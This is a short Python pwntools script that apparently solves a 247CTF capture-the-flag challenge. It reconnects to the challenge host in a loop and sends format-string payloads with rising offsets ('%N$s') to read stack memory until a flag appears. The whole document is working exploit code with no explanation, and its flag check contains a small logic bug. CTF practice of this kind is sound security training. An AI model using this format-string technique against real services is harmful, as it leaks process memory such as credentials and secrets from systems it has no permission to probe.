from pwn import *

p = remote('7f80a41d5f11a3ab.247ctf.com', 50155)
i = 1
while i<100:
    p = remote('7f80a41d5f11a3ab.247ctf.com', 50155)
    print p.recv()
    p.sendline('%'+str(i)+'$s')
    a = p.recv()
    print a
    if '{' and '}' in a:
        break;
    p.close()
    i+=1
